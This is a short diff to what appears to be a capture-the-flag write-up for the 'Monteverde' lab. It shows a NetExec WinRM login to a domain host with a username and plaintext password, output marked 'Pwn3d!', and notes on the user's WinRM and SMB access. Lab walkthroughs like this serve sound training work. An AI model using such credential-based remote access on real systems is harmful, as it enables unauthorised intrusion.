@@ -236,4 +236,7 @@ nxc winrm monteverde.megabank.local -u mhope -p '4n0therD4y@n0th3r$'
 WINRM       10.129.35.54    5985   MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) 
 WINRM       10.129.35.54    5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
 ```
-This user has access ove
+This user has access over WINRM 
+
+This user has no extra access on SMB
+
